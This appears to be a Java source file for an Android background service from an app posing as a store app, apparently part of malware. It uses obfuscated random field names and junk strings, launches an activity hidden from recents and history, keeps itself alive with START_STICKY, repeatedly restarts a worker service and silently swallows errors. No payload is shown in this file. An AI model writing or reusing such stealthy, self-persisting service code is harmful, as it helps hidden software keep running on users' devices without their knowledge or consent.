package store.apps;


import android.app.Service;
import android.content.Context;
import android.content.Intent;

import android.os.IBinder;

public class MainReflectorScan extends Service {

    public static String Alfagama = "";
    public static String ELTBYPyAbVopfHCzsYOgTZBqANOVMm = "[RANDOM-STRING]";
    public static String IrqxSNTjlmXGdvaFDbDgYehsTMqLDi = "[RANDOM-STRING]";
    public static String CHPxHESuFhQTehtQgiSduXkxVmzrDe = "[RANDOM-STRING]";
    @Override
    public void onCreate() {
        super.onCreate();
        try{



            Context basectx = getApplicationContext();
            Intent dialogIntent = new Intent(this, flyactiv.class);
            dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            dialogIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
            dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
            dialogIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
            basectx.startActivity(dialogIntent);

            ScanNewIntent(basectx,"[RANDOM-STRING]");
        }catch (Exception e){}


    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
       // MyInt = intent;


        ScanNewIntent(getApplicationContext(),"[RANDOM-STRING]"+ ELTBYPyAbVopfHCzsYOgTZBqANOVMm);

        return START_STICKY;
    }

    private void ScanNewIntent(Context applicationContext,String str) {
        if (str.length()>1)
        {
            try{
                if (RTPluginsHelper._mthd_issrvrun_(EngineWorkerins.class, applicationContext,"[RANDOM-STRING]"+CHPxHESuFhQTehtQgiSduXkxVmzrDe)) {
                    Intent i = new Intent(this, EngineWorkerins.class);
                    DataScan1.sr(applicationContext,i);
                    // SleepTime = 10000;
                }

            }catch (Exception e){}
        }

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
      //  onTaskRemoved(MyInt);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}